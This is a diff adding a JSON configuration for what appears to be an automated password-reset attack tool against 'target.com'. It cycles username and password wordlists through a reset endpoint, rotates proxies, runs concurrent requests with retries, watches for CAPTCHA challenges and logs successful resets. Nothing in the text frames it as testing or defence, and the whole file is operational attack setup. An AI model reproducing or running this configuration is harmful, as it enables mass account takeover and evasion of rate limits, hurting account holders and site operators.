@@ -1,0 +1,24 @@
+{
+    "reset_url": "https://target.com/reset",
+    "username_list": "usernames.txt",
+    "password_list": "passwords.txt",
+    "proxy_list": "proxies.txt",
+    "rate_limit": 2.0,
+    "max_concurrency": 20,
+    "timeout": 15,
+    "max_retries": 3,
+    "output_file": "success.json",
+    "payload": {
+        "username": "{username}",
+        "new_password": "{password}",
+        "confirm_password": "{password}"
+    },
+    "success_indicators": ["success", "reset successful"],
+    "failure_indicators": ["error", "invalid", "failed"],
+    "captcha_indicators": ["captcha", "recaptcha", "verify"],
+    "json_payload": false,
+    "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Referer": "https://target.com/login"
+    }
+}
